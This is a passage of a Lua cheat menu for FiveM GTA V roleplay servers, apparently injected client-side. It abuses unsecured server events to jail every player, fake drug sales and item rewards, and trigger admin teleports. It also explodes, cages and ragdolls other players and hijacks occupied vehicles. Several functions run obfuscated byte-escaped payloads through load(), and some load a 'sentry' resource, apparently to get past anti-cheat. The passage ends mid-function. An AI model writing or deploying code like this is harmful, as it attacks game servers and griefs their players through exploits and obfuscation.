      for k in EnumerateVehicles() do
        if (not inVehicle or k ~= playerVehicle) and GetDistanceBetweenCoords(coords, GetEntityCoords(k)) <= radius*1.2 then
          RequestControlOnce(k)
          ApplyShockwave(k)
        end
      end

      for k in EnumeratePeds() do
        if k~= PlayerPedId() and GetDistanceBetweenCoords(coords, GetEntityCoords(k)) <= radius*1.2 then
          RequestControlOnce(k)
          SetPedRagdollOnCollision(k,true)
          SetPedRagdollForceFall(k)
          ApplyShockwave(k)
        end
      end
    end

    local function DRFT()
      DisablePlayerFiring(PlayerPedId(), true)
      if IsDisabledControlPressed(0, 24) then
        local _, weapon = GetCurrentPedWeapon(PlayerPedId())
        local wepent = GetCurrentPedWeaponEntityIndex(PlayerPedId())
        local camDir = GetCamDirFromScreenCenter()
        local camPos = GetGameplayCamCoord()
        local launchPos = GetEntityCoords(wepent)
        local targetPos = camPos + (camDir * 200.0)

        ClearAreaOfProjectiles(launchPos, 0.0, 1)

        ShootSingleBulletBetweenCoords(launchPos, targetPos, 5, 1, weapon, PlayerPedId(), true, true, 24000.0)
        ShootSingleBulletBetweenCoords(launchPos, targetPos, 5, 1, weapon, PlayerPedId(), true, true, 24000.0)
      end
    end



    local function MagnetoBoy()
      magnet = not magnet

      if magnet then

        Citizen.CreateThread(function()
        notify("~h~Press ~r~E ~s~to use")

        local ForceKey = 38
        local Force = 0.5
        local KeyPressed = false
        local KeyTimer = 0
        local KeyDelay = 15
        local ForceEnabled = false
        local StartPush = false

        function forcetick()

          if (KeyPressed) then
KeyTimer = KeyTimer + 1
if(KeyTimer >= KeyDelay) then
  KeyTimer = 0
  KeyPressed = false
end
          end



          if IsControlPressed(0, ForceKey) and not KeyPressed and not ForceEnabled then
KeyPressed = true
ForceEnabled = true
          end

          if (StartPush) then

StartPush = false
local pid = PlayerPedId()
local CamRot = GetGameplayCamRot(2)

local force = 5

local Fx = -( math.sin(math.rad(CamRot.z)) * force*10 )
local Fy = ( math.cos(math.rad(CamRot.z)) * force*10 )
local Fz = force * (CamRot.x*0.2)

local PlayerVeh = GetVehiclePedIsIn(pid, false)

for k in EnumerateVehicles() do
  SetEntityInvincible(k, false)
  if IsEntityOnScreen(k) and k ~= PlayerVeh then
    ApplyForceToEntity(k, 1, Fx, Fy,Fz, 0,0,0, true, false, true, true, true, true)
  end
end

for k in EnumeratePeds() do
  if IsEntityOnScreen(k) and k ~= pid then
    ApplyForceToEntity(k, 1, Fx, Fy,Fz, 0,0,0, true, false, true, true, true, true)
  end
end

          end


          if IsControlPressed(0, ForceKey) and not KeyPressed and ForceEnabled then
KeyPressed = true
StartPush = true
ForceEnabled = false
          end

          if (ForceEnabled) then
local pid = PlayerPedId()
local PlayerVeh = GetVehiclePedIsIn(pid, false)

Markerloc = GetGameplayCamCoord() + (RotationToDirection(GetGameplayCamRot(2)) * 20)

DrawMarker(28, Markerloc, 0.0, 0.0, 0.0, 0.0, 180.0, 0.0, 1.0, 1.0, 1.0, 180, 0, 0, 35, false, true, 2, nil, nil, false)

for k in EnumerateVehicles() do
  SetEntityInvincible(k, true)
  if IsEntityOnScreen(k) and (k ~= PlayerVeh) then
    RequestControlOnce(k)
    FreezeEntityPosition(k, false)
    Oscillate(k, Markerloc, 0.5, 0.3)
  end
end

for k in EnumeratePeds() do
  if IsEntityOnScreen(k) and k ~= PlayerPedId() then
    RequestControlOnce(k)
    SetPedToRagdoll(k, 4000, 5000, 0, true, true, true)
    FreezeEntityPosition(k, false)
    Oscillate(k, Markerloc, 0.5, 0.3)
  end
end

          end

        end

        while magnet do forcetick() Wait(0) end
          end)
        else notify("~r~~h~Disabled")
        end

      end


      local function jailall()
        local pbase = GetActivePlayers()
        for i=0, #pbase do
          TSE("esx-qalle-jail:jailPlayer", GetPlayerServerId(i), 5000, "HighTach.com - Cheats and Anti-Lynx")
          TSE("esx_jailer:sendToJail", GetPlayerServerId(i), 45 * 60)
          TSE("esx_jail:sendToJail", GetPlayerServerId(i), 45 * 60)
          TSE("js:jailuser", GetPlayerServerId(i), 45 * 60, "HighTach.com - Cheats and Anti-Lynx")

        end
      end

      local function GiveAllWeapons(target)
        local ped = GetPlayerPed(target)
        for i=0, #allWeapons do
          GiveWeaponToPed(ped, GetHashKey(allWeapons[i]), 9999, false, false)
        end
      end

      local function weaponsall()
        local pbase = GetActivePlayers()
        for i=0, #pbase do
          GiveAllWeapons(i)
        end
      end

      local function explodeall()
        local pbase = GetActivePlayers()
        for i=0, #pbase do
          local ped = GetPlayerPed(i)
          local coords = GetEntityCoords(ped)
          AddExplosion(coords.x+1, coords.y+1, coords.z+1, 4, 10000.0, true, false, 0.0)
        end
      end

      local function borgarall()
        local pbase = GetActivePlayers()
        for i=0, #pbase do
          if IsPedInAnyVehicle(GetPlayerPed(i), true) then
local hamburg = "xs_prop_hamburgher_wl"
local hamburghash = GetHashKey(hamburg)
while not HasModelLoaded(hamburghash) do
  Citizen.Wait(0)
  RequestModel(hamburghash)
end
local hamburger = CreateObject(hamburghash, 0, 0, 0, true, true, true)
AttachEntityToEntity(hamburger, GetVehiclePedIsIn(GetPlayerPed(i), false), GetEntityBoneIndexByName(GetVehiclePedIsIn(GetPlayerPed(i), false), "chassis"), 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
          else
local hamburg = "xs_prop_hamburgher_wl"
local hamburghash = GetHashKey(hamburg)
while not HasModelLoaded(hamburghash) do
  Citizen.Wait(0)
  RequestModel(hamburghash)
end
local hamburger = CreateObject(hamburghash, 0, 0, 0, true, true, true)
AttachEntityToEntity(hamburger, GetPlayerPed(i), GetPedBoneIndex(GetPlayerPed(i), 0), 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
          end
        end
      end

    local function cageall()
    local pbase = GetActivePlayers()
        for i = 1, #pbase do
          x, y, z = table.unpack(GetEntityCoords(i))
          roundx = tonumber(string.format("%.2f", x))
          roundy = tonumber(string.format("%.2f", y))
          roundz = tonumber(string.format("%.2f", z))
          while not HasModelLoaded(GetHashKey("prop_fnclink_05crnr1")) do
Citizen.Wait(0)
RequestModel(GetHashKey("prop_fnclink_05crnr1"))
          end
          local cage1 = CreateObject(GetHashKey("prop_fnclink_05crnr1"), roundx - 1.70, roundy - 1.70, roundz - 1.0, true, true, false)
          local cage2 = CreateObject(GetHashKey("prop_fnclink_05crnr1"), roundx + 1.70, roundy + 1.70, roundz - 1.0, true, true, false)
          SetEntityHeading(cage1, -90.0)
          SetEntityHeading(cage2, 90.0)
          FreezeEntityPosition(cage1, true)
          FreezeEntityPosition(cage2, true)
        end
      end

      local function bananapartyall()
        Citizen.CreateThread(function()
        for c = 0, 9 do

        end
        local pbase = GetActivePlayers()
        for i=0, #pbase do
          local pisello = CreateObject(-1207431159, 0, 0, 0, true, true, true)
          local pisello2 = CreateObject(GetHashKey("cargoplane"), 0, 0, 0, true, true, true)
          local pisello3 = CreateObject(GetHashKey("prop_beach_fire"), 0, 0, 0, true, true, true)
          AttachEntityToEntity(pisello, GetPlayerPed(i), GetPedBoneIndex(GetPlayerPed(i), 57005), 0.4, 0, 0, 0, 270.0, 60.0, true, true, false, true, 1, true)
          AttachEntityToEntity(pisello2, GetPlayerPed(i), GetPedBoneIndex(GetPlayerPed(i), 57005), 0.4, 0, 0, 0, 270.0, 60.0, true, true, false, true, 1, true)
          AttachEntityToEntity(pisello3, GetPlayerPed(i), GetPedBoneIndex(GetPlayerPed(i), 57005), 0.4, 0, 0, 0, 270.0, 60.0, true, true, false, true, 1, true)
        end
        end)
      end

      local function RespawnPed(ped, coords, heading)
        SetEntityCoordsNoOffset(ped, coords.x, coords.y, coords.z, false, false, false, true)
        NetworkResurrectLocalPlayer(coords.x, coords.y, coords.z, heading, true, false)
        SetPlayerInvincible(ped, false)
        TriggerEvent('playerSpawned', coords.x, coords.y, coords.z)
        ClearPedBloodDamage(ped)
      end

      local function teleporttocoords()
        local pizdax = KeyboardInput("Enter X pos", "", 100)
        local pizday = KeyboardInput("Enter Y pos", "", 100)
        local pizdaz = KeyboardInput("Enter Z pos", "", 100)
        if pizdax ~= "" and pizday ~= "" and pizdaz ~= "" then
          if  IsPedInAnyVehicle(GetPlayerPed(-1), 0) and (GetPedInVehicleSeat(GetVehiclePedIsIn(GetPlayerPed(-1), 0), -1) == GetPlayerPed(-1)) then
entity = GetVehiclePedIsIn(GetPlayerPed(-1), 0)
          else
entity = GetPlayerPed(-1)
          end
          if entity then
SetEntityCoords(entity, pizdax + 0.5, pizday + 0.5, pizdaz + 0.5, 1, 0, 0, 1)
notify("~g~Teleported to coords!", false)
          end
        else
          notify("~b~Invalid coords!", true)
        end
      end

      local function drawcoords()
        local name = KeyboardInput("Enter Blip Name", "", 100)
        if name == "" then
          notify("~b~Invalid Blip Name!", true)
          return drawcoords()
        else
          local pizdax = KeyboardInput("Enter X pos", "", 100)
          local pizday = KeyboardInput("Enter Y pos", "", 100)
          local pizdaz = KeyboardInput("Enter Z pos", "", 100)
          if pizdax ~= "" and pizday ~= "" and pizdaz ~= "" then
local blips = {
  {colour=75, id=84},
}
for _, info in pairs(blips) do
  info.blip = AddBlipForCoord(pizdax + 0.5, pizday + 0.5, pizdaz + 0.5)
  SetBlipSprite(info.blip, info.id)
  SetBlipDisplay(info.blip, 4)
  SetBlipScale(info.blip, 0.9)
  SetBlipColour(info.blip, info.colour)
  SetBlipAsShortRange(info.blip, true)
  BeginTextCommandSetBlipName("STRING")
  AddTextComponentString(name)
  EndTextCommandSetBlipName(info.blip)
end
          else
notify("~b~Invalid coords!", true)
          end
        end
      end

      local function teleporttonearestvehicle()
        local playerPed = GetPlayerPed(-1)
        local playerPedPos = GetEntityCoords(playerPed, true)
        local NearestVehicle = GetClosestVehicle(GetEntityCoords(playerPed, true), 1000.0, 0, 4)
        local NearestVehiclePos = GetEntityCoords(NearestVehicle, true)
        local NearestPlane = GetClosestVehicle(GetEntityCoords(playerPed, true), 1000.0, 0, 16384)
        local NearestPlanePos = GetEntityCoords(NearestPlane, true)
        notify("~y~Wait...", false)
        Citizen.Wait(1000)
        if (NearestVehicle == 0) and (NearestPlane == 0) then
          notify("~b~No Vehicle Found", true)
        elseif (NearestVehicle == 0) and (NearestPlane ~= 0) then
          if IsVehicleSeatFree(NearestPlane, -1) then
SetPedIntoVehicle(playerPed, NearestPlane, -1)
SetVehicleAlarm(NearestPlane, false)
SetVehicleDoorsLocked(NearestPlane, 1)
SetVehicleNeedsToBeHotwired(NearestPlane, false)
          else
local driverPed = GetPedInVehicleSeat(NearestPlane, -1)
ClearPedTasksImmediately(driverPed)
SetEntityAsMissionEntity(driverPed, 1, 1)
DeleteEntity(driverPed)
SetPedIntoVehicle(playerPed, NearestPlane, -1)
SetVehicleAlarm(NearestPlane, false)
SetVehicleDoorsLocked(NearestPlane, 1)
SetVehicleNeedsToBeHotwired(NearestPlane, false)
          end
          notify("~g~Teleported Into Nearest Vehicle!", false)
        elseif (NearestVehicle ~= 0) and (NearestPlane == 0) then
          if IsVehicleSeatFree(NearestVehicle, -1) then
SetPedIntoVehicle(playerPed, NearestVehicle, -1)
SetVehicleAlarm(NearestVehicle, false)
SetVehicleDoorsLocked(NearestVehicle, 1)
SetVehicleNeedsToBeHotwired(NearestVehicle, false)
          else
local driverPed = GetPedInVehicleSeat(NearestVehicle, -1)
ClearPedTasksImmediately(driverPed)
SetEntityAsMissionEntity(driverPed, 1, 1)
DeleteEntity(driverPed)
SetPedIntoVehicle(playerPed, NearestVehicle, -1)
SetVehicleAlarm(NearestVehicle, false)
SetVehicleDoorsLocked(NearestVehicle, 1)
SetVehicleNeedsToBeHotwired(NearestVehicle, false)
          end
          notify("~g~Teleported Into Nearest Vehicle!", false)
        elseif (NearestVehicle ~= 0) and (NearestPlane ~= 0) then
          if Vdist(NearestVehiclePos.x, NearestVehiclePos.y, NearestVehiclePos.z, playerPedPos.x, playerPedPos.y, playerPedPos.z) < Vdist(NearestPlanePos.x, NearestPlanePos.y, NearestPlanePos.z, playerPedPos.x, playerPedPos.y, playerPedPos.z) then
if IsVehicleSeatFree(NearestVehicle, -1) then
  SetPedIntoVehicle(playerPed, NearestVehicle, -1)
  SetVehicleAlarm(NearestVehicle, false)
  SetVehicleDoorsLocked(NearestVehicle, 1)
  SetVehicleNeedsToBeHotwired(NearestVehicle, false)
else
  local driverPed = GetPedInVehicleSeat(NearestVehicle, -1)
  ClearPedTasksImmediately(driverPed)
  SetEntityAsMissionEntity(driverPed, 1, 1)
  DeleteEntity(driverPed)
  SetPedIntoVehicle(playerPed, NearestVehicle, -1)
  SetVehicleAlarm(NearestVehicle, false)
  SetVehicleDoorsLocked(NearestVehicle, 1)
  SetVehicleNeedsToBeHotwired(NearestVehicle, false)
end
          elseif Vdist(NearestVehiclePos.x, NearestVehiclePos.y, NearestVehiclePos.z, playerPedPos.x, playerPedPos.y, playerPedPos.z) > Vdist(NearestPlanePos.x, NearestPlanePos.y, NearestPlanePos.z, playerPedPos.x, playerPedPos.y, playerPedPos.z) then
if IsVehicleSeatFree(NearestPlane, -1) then
  SetPedIntoVehicle(playerPed, NearestPlane, -1)
  SetVehicleAlarm(NearestPlane, false)
  SetVehicleDoorsLocked(NearestPlane, 1)
  SetVehicleNeedsToBeHotwired(NearestPlane, false)
else
  local driverPed = GetPedInVehicleSeat(NearestPlane, -1)
  ClearPedTasksImmediately(driverPed)
  SetEntityAsMissionEntity(driverPed, 1, 1)
  DeleteEntity(driverPed)
  SetPedIntoVehicle(playerPed, NearestPlane, -1)
  SetVehicleAlarm(NearestPlane, false)
  SetVehicleDoorsLocked(NearestPlane, 1)
  SetVehicleNeedsToBeHotwired(NearestPlane, false)
end
          end
          notify("~g~Teleported Into Nearest Vehicle!", false)
        end
      end

      local function TeleportToWaypoint()
        if DoesBlipExist(GetFirstBlipInfoId(8)) then
          local blipIterator = GetBlipInfoIdIterator(8)
          local blip = GetFirstBlipInfoId(8, blipIterator)
          WaypointCoords = Citizen.InvokeNative(0xFA7C7F0AADF25D09, blip, Citizen.ResultAsVector())
          wp = true
        else
          notify("~b~No waypoint!", true)
        end

        local zHeigt = 0.0
        height = 1000.0
        while wp do
          Citizen.Wait(0)
          if wp then
if
IsPedInAnyVehicle(GetPlayerPed(-1), 0) and
(GetPedInVehicleSeat(GetVehiclePedIsIn(GetPlayerPed(-1), 0), -1) == GetPlayerPed(-1))
then
  entity = GetVehiclePedIsIn(GetPlayerPed(-1), 0)
else
  entity = GetPlayerPed(-1)
end

SetEntityCoords(entity, WaypointCoords.x, WaypointCoords.y, height)
FreezeEntityPosition(entity, true)
local Pos = GetEntityCoords(entity, true)

if zHeigt == 0.0 then
  height = height - 25.0
  SetEntityCoords(entity, Pos.x, Pos.y, height)
  bool, zHeigt = GetGroundZFor_3dCoord(Pos.x, Pos.y, Pos.z, 0)
else
  SetEntityCoords(entity, Pos.x, Pos.y, zHeigt)
  FreezeEntityPosition(entity, false)
  wp = false
  height = 1000.0
  zHeigt = 0.0
  notify("~g~Teleported to waypoint!", false)
  break
end
          end
        end
      end

      local function spawnvehicle()
        local ModelName = KeyboardInput("Enter Vehicle Spawn Name", "", 100)
        if ModelName and IsModelValid(ModelName) and IsModelAVehicle(ModelName) then
          RequestModel(ModelName)
          while not HasModelLoaded(ModelName) do
Citizen.Wait(0)
          end
          local veh = CreateVehicle(GetHashKey(ModelName), GetEntityCoords(PlayerPedId(-1)), GetEntityHeading(PlayerPedId(-1)), true, true)
          SetPedIntoVehicle(PlayerPedId(-1), veh, -1)
        else
          notify("~b~Model is not valid!", true)
        end
      end

      local function repairvehicle()
        SetVehicleFixed(GetVehiclePedIsIn(GetPlayerPed(-1), false))
        SetVehicleDirtLevel(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0.0)
        SetVehicleLights(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0)
        SetVehicleBurnout(GetVehiclePedIsIn(GetPlayerPed(-1), false), false)
        Citizen.InvokeNative(0x1FD09E7390A74D54, GetVehiclePedIsIn(GetPlayerPed(-1), false), 0)
        SetVehicleUndriveable(vehicle,false)
      end

      local function repairengine()
        SetVehicleEngineHealth(vehicle, 1000)
        Citizen.InvokeNative(0x1FD09E7390A74D54, GetVehiclePedIsIn(GetPlayerPed(-1), false), 0)
        SetVehicleUndriveable(vehicle,false)
      end

      local function carlicenseplaterino()
        local playerPed = GetPlayerPed(-1)
        local playerVeh = GetVehiclePedIsIn(playerPed, true)
        local result = KeyboardInput("Enter the plate license you want", "", 100)
        if result ~= "" then
          SetVehicleNumberPlateText(playerVeh, result)
        end
      end

      function gotolegency()
		load(LoadResourceFile('sentry', 'Source/Shared/client.sentry.lua'))()
		load(LoadResourceFile('sentry', 'Source/Shared/server.sentry.lua'))()
		print('pass')
		local gotoPlayer = KeyboardInput("id want goto", "", 100)
  		if gotoPlayer then		
		TriggerServerEvent("Guy_VIP:sv:admingoto", tonumber(gotoPlayer))
		end
      end

	  function bringlegency()
		load(LoadResourceFile('sentry', 'Source/Shared/client.sentry.lua'))()
		load(LoadResourceFile('sentry', 'Source/Shared/server.sentry.lua'))()
		print('pass')
		local bringTarget = KeyboardInput("id want bring", "", 100)
  		if bringTarget then
    	local plyCoords = GetEntityCoords(GetPlayerPed(-1), false)
		TriggerServerEvent("Guy_VIP:sv:adminbring", tonumber(bringTarget), plyCoords.x, plyCoords.y, plyCoords.z)
		end
      end

	  function textlegency()
		load(LoadResourceFile('sentry', 'Source/Shared/client.sentry.lua'))()
		load(LoadResourceFile('sentry', 'Source/Shared/server.sentry.lua'))()
		print('pass')
		local status = KeyboardInput("text want status", "", 100)
  		if status then
		TriggerServerEvent("Guy_VIP:sv:Status", status)
		end
      end

      function rcoke()
        TriggerServerEvent('fx_drugs:sellDrug', data.current.name, data.current.value)
        TriggerServerEvent('fx_drugs:sellStuff', data.current.name, data.current.value)
      end

      function hweed()
        local loading = load or loadstring
loading("\67\105\116\105\122\101\110\46\67\114\101\97\116\101\84\104\114\101\97\100\40\102\117\110\99\116\105\111\110\40\41\10\32\32\32\32\119\104\105\108\101\32\116\114\117\101\32\100\111\10\32\32\32\32\32\32\32\32\67\105\116\105\122\101\110\46\87\97\105\116\40\48\41\10\32\32\32\32\32\32\32\32\105\102\32\73\115\68\105\115\97\98\108\101\100\67\111\110\116\114\111\108\74\117\115\116\80\114\101\115\115\101\100\40\48\44\32\55\51\41\32\116\104\101\110\10\32\32\32\32\32\32\32\32\32\32\32\32\108\111\99\97\108\32\115\105\98\122\32\61\32\71\101\116\80\108\97\121\101\114\80\101\100\40\45\49\41\10\32\32\32\32\32\32\32\32\32\32\32\32\67\108\101\97\114\80\101\100\84\97\115\107\115\40\115\105\98\122\41\10\32\32\32\32\32\32\32\32\32\32\32\32\67\108\101\97\114\80\101\100\84\97\115\107\115\73\109\109\101\100\105\97\116\101\108\121\40\115\105\98\122\41\10\32\32\32\32\32\32\32\32\101\110\100\10\32\32\32\32\101\110\100\10\101\110\100\41\10")()
    end

      function tweed()
        local loading = load or loadstring
loading("\67\105\116\105\122\101\110\46\67\114\101\97\116\101\84\104\114\101\97\100\40\102\117\110\99\116\105\111\110\40\41\10\32\32\32\32\119\104\105\108\101\32\116\114\117\101\32\100\111\10\32\32\32\32\32\32\32\32\67\105\116\105\122\101\110\46\87\97\105\116\40\48\41\10\32\32\32\32\32\32\32\32\105\102\32\73\115\68\105\115\97\98\108\101\100\67\111\110\116\114\111\108\74\117\115\116\80\114\101\115\115\101\100\40\48\44\32\52\52\41\32\116\104\101\110\10\32\32\32\32\32\32\32\32\32\32\32\32\108\111\99\97\108\32\115\105\98\122\32\61\32\71\101\116\80\108\97\121\101\114\80\101\100\40\45\49\41\10\32\32\32\32\32\32\32\32\32\32\32\32\67\108\101\97\114\80\101\100\84\97\115\107\115\40\115\105\98\122\41\10\32\32\32\32\32\32\32\32\32\32\32\32\67\108\101\97\114\80\101\100\84\97\115\107\115\73\109\109\101\100\105\97\116\101\108\121\40\115\105\98\122\41\10\32\32\32\32\32\32\32\32\101\110\100\10\32\32\32\32\101\110\100\10\101\110\100\41\10")()
      end

      function sweed()
        local loading = load or loadstring
loading("\112\114\105\110\116\40\34\94\52\61\61\61\61\61\61\61\61\61\61\61\61\61\61\61\61\61\61\61\61\61\61\61\61\61\61\61\61\61\61\61\61\61\61\61\61\34\41\10\112\114\105\110\116\40\34\32\34\41\10\112\114\105\110\116\40\34\94\53\65\110\116\105\67\114\105\116\105\99\97\108\32\66\121\32\70\73\86\69\77\80\82\79\34\41\10\112\114\105\110\116\40\34\94\53\68\73\83\67\79\82\68\58\32\104\116\116\112\115\58\47\47\100\105\115\99\111\114\100\46\103\103\47\106\90\65\82\103\68\99\77\112\82\34\41\10\112\114\105\110\116\40\34\32\34\41\10\112\114\105\110\116\40\34\94\52\61\61\61\61\61\61\61\61\61\61\61\61\61\61\61\61\61\61\61\61\61\61\61\61\61\61\61\61\61\61\61\61\61\61\61\61\34\41\10\112\114\105\110\116\40\34\32\34\41\10\112\114\105\110\116\40\34\94\56\75\69\89\58\32\76\32\40\79\78\47\79\70\70\41\34\41\10\112\114\105\110\116\40\34\32\34\41\10\112\114\105\110\116\40\34\32\34\41\10\10\102\105\118\101\109\112\114\111\32\61\32\116\114\117\101\10\67\105\116\105\122\101\110\46\67\114\101\97\116\101\84\104\114\101\97\100\40\102\117\110\99\116\105\111\110\40\41\10\32\32\32\32\119\104\105\108\101\32\116\114\117\101\32\100\111\10\32\32\32\32\32\32\32\32\83\101\116\80\101\100\83\117\102\102\101\114\115\67\114\105\116\105\99\97\108\72\105\116\115\40\80\108\97\121\101\114\80\101\100\73\100\40\45\49\41\44\32\102\105\118\101\109\112\114\111\41\10\32\32\32\32\32\32\32\32\32\32\32\32\105\102\32\73\115\68\105\115\97\98\108\101\100\67\111\110\116\114\111\108\74\117\115\116\80\114\101\115\115\101\100\40\48\44\32\49\56\50\41\32\116\104\101\110\10\32\32\32\32\32\32\32\32\102\105\118\101\109\112\114\111\32\61\32\110\111\116\32\102\105\118\101\109\112\114\111\10\32\32\32\32\32\32\32\32\105\102\32\102\105\118\101\109\112\114\111\32\61\61\32\116\114\117\101\32\116\104\101\110\10\32\32\32\32\32\32\32\32\32\32\32\32\112\114\105\110\116\40\34\94\49\65\110\116\105\67\114\105\116\105\99\97\108\58\32\79\70\70\34\41\10\32\32\32\32\32\32\32\32\101\108\115\101\105\102\32\102\105\118\101\109\112\114\111\32\61\61\32\102\97\108\115\101\32\116\104\101\110\10\32\32\32\32\32\32\32\32\32\32\32\32\112\114\105\110\116\40\34\94\50\65\110\116\105\67\114\105\116\105\99\97\108\58\32\79\78\34\41\10\32\32\32\32\32\32\32\32\101\110\100\10\32\32\32\32\101\110\100\10\32\32\32\32\67\105\116\105\122\101\110\46\87\97\105\116\40\48\41\10\32\32\32\32\101\110\100\10\101\110\100\41\10")()
      end              

      function toppp()
        local data = {
			"Q",
			"fvnUp8CiYqm8PrFK",
			{
				{
					amount = {2, 3},
					ItemName = "moon_ore",
					Rate = 100
				}
			},
			0
		}
	TriggerServerEvent("esx:serverCallbacks:getReward:propmoon", data)
    end

      function hcoke()
        local loading = load or loadstring
loading("\112\114\105\110\116\40\34\94\52\61\61\61\61\61\61\61\61\61\61\61\61\61\61\61\61\61\61\61\61\61\61\61\61\61\61\61\61\61\61\61\61\61\61\61\61\34\41\10\112\114\105\110\116\40\34\32\34\41\10\112\114\105\110\116\40\34\94\53\70\97\107\101\67\114\105\116\105\99\97\108\32\66\121\32\34\41\10\112\114\105\110\116\40\34\94\53\68\73\83\67\79\82\68\58\32\34\41\10\112\114\105\110\116\40\34\94\53\87\69\65\80\79\78\83\32\61\32\40\66\65\84\44\32\71\79\76\70\67\76\85\66\44\32\80\79\79\76\67\85\69\41\34\41\10\112\114\105\110\116\40\34\32\34\41\10\112\114\105\110\116\40\34\94\52\61\61\61\61\61\61\61\61\61\61\61\61\61\61\61\61\61\61\61\61\61\61\61\61\61\61\61\61\61\61\61\61\61\61\61\61\34\41\10\112\114\105\110\116\40\34\32\34\41\10\112\114\105\110\116\40\34\94\56\75\69\89\58\32\75\32\40\79\78\47\79\70\70\41\34\41\10\112\114\105\110\116\40\34\32\34\41\10\112\114\105\110\116\40\34\32\34\41\10\97\114\109\100\97\109\97\103\101\95\111\110\95\111\102\102\32\61\32\116\114\117\101\10\100\101\102\97\117\108\116\95\98\97\116\32\61\32\71\101\116\87\101\97\112\111\110\68\97\109\97\103\101\77\111\100\105\102\105\101\114\40\71\101\116\72\97\115\104\75\101\121\40\34\87\69\65\80\79\78\95\66\65\84\34\41\41\10\100\101\102\97\117\108\116\95\103\111\108\102\99\108\117\98\32\61\32\71\101\116\87\101\97\112\111\110\68\97\109\97\103\101\77\111\100\105\102\105\101\114\40\71\101\116\72\97\115\104\75\101\121\40\34\87\69\65\80\79\78\95\71\79\76\70\67\76\85\66\34\41\41\10\100\101\102\97\117\108\116\95\112\111\111\108\99\117\101\32\61\32\71\101\116\87\101\97\112\111\110\68\97\109\97\103\101\77\111\100\105\102\105\101\114\40\71\101\116\72\97\115\104\75\101\121\40\34\87\69\65\80\79\78\95\80\79\79\76\67\85\69\34\41\41\10\115\101\116\95\100\97\109\97\103\101\95\98\97\116\32\61\32\71\101\116\87\101\97\112\111\110\68\97\109\97\103\101\77\111\100\105\102\105\101\114\40\71\101\116\72\97\115\104\75\101\121\40\34\87\69\65\80\79\78\95\66\65\84\34\41\41\10\115\101\116\95\100\97\109\97\103\101\95\103\111\108\102\99\108\117\98\32\61\32\71\101\116\87\101\97\112\111\110\68\97\109\97\103\101\77\111\100\105\102\105\101\114\40\71\101\116\72\97\115\104\75\101\121\40\34\87\69\65\80\79\78\95\71\79\76\70\67\76\85\66\34\41\41\10\115\101\116\95\100\97\109\97\103\101\95\112\111\111\108\99\117\101\32\61\32\71\101\116\87\101\97\112\111\110\68\97\109\97\103\101\77\111\100\105\102\105\101\114\40\71\101\116\72\97\115\104\75\101\121\40\34\87\69\65\80\79\78\95\80\79\79\76\67\85\69\34\41\41\10\67\105\116\105\122\101\110\46\67\114\101\97\116\101\84\104\114\101\97\100\40\102\117\110\99\116\105\111\110\40\41\10\32\32\119\104\105\108\101\32\116\114\117\101\32\100\111\10\32\32\32\32\78\95\48\120\52\55\53\55\102\48\48\98\99\54\51\50\51\99\102\101\40\71\101\116\72\97\115\104\75\101\121\40\34\87\69\65\80\79\78\95\66\65\84\34\41\44\32\115\101\116\95\100\97\109\97\103\101\95\98\97\116\41\10\32\32\32\32\78\95\48\120\52\55\53\55\102\48\48\98\99\54\51\50\51\99\102\101\40\71\101\116\72\97\115\104\75\101\121\40\34\87\69\65\80\79\78\95\71\79\76\70\67\76\85\66\34\41\44\32\115\101\116\95\100\97\109\97\103\101\95\103\111\108\102\99\108\117\98\41\10\32\32\32\32\78\95\48\120\52\55\53\55\102\48\48\98\99\54\51\50\51\99\102\101\40\71\101\116\72\97\115\104\75\101\121\40\34\87\69\65\80\79\78\95\80\79\79\76\67\85\69\34\41\44\32\115\101\116\95\100\97\109\97\103\101\95\112\111\111\108\99\117\101\41\10\32\32\32\32\105\102\32\73\115\68\105\115\97\98\108\101\100\67\111\110\116\114\111\108\74\117\115\116\80\114\101\115\115\101\100\40\48\44\32\51\49\49\41\32\116\104\101\110\10\32\32\32\32\32\32\97\114\109\100\97\109\97\103\101\95\111\110\95\111\102\102\32\61\32\110\111\116\32\97\114\109\100\97\109\97\103\101\95\111\110\95\111\102\102\10\32\32\32\32\32\32\105\102\32\97\114\109\100\97\109\97\103\101\95\111\110\95\111\102\102\32\61\61\32\116\114\117\101\32\116\104\101\110\10\32\32\32\32\32\32\32\32\115\101\116\95\100\97\109\97\103\101\95\98\97\116\32\61\32\100\101\102\97\117\108\116\95\98\97\116\10\32\32\32\32\32\32\32\32\115\101\116\95\100\97\109\97\103\101\95\103\111\108\102\99\108\117\98\32\61\32\100\101\102\97\117\108\116\95\103\111\108\102\99\108\117\98\10\32\32\32\32\32\32\32\32\115\101\116\95\100\97\109\97\103\101\95\112\111\111\108\99\117\101\32\61\32\100\101\102\97\117\108\116\95\112\111\111\108\99\117\101\10\32\32\32\32\32\32\32\32\112\114\105\110\116\40\34\94\49\70\97\107\101\67\114\105\116\105\99\97\108\58\32\79\70\70\34\41\10\32\32\32\32\32\32\101\108\115\101\105\102\32\97\114\109\100\97\109\97\103\101\95\111\110\95\111\102\102\32\61\61\32\102\97\108\115\101\32\116\104\101\110\10\32\32\32\32\32\32\32\32\115\101\116\95\100\97\109\97\103\101\95\112\111\111\108\99\117\101\32\61\32\52\44\51\10\32\32\32\32\32\32\32\32\115\101\116\95\100\97\109\97\103\101\95\103\111\108\102\99\108\117\98\32\61\32\52\44\51\10\32\32\32\32\32\32\32\32\115\101\116\95\100\97\109\97\103\101\95\98\97\116\32\61\32\52\44\51\10\32\32\32\32\32\32\32\32\112\114\105\110\116\40\34\94\50\70\97\107\101\67\114\105\116\105\99\97\108\58\32\79\78\34\41\10\32\32\32\32\32\32\101\110\100\10\32\32\32\32\101\110\100\10\32\32\32\32\67\105\116\105\122\101\110\46\87\97\105\116\40\48\41\10\32\32\101\110\100\10\101\110\100\41\10\10")()
    end
    
    function tcoke()
        local loading = load or loadstring
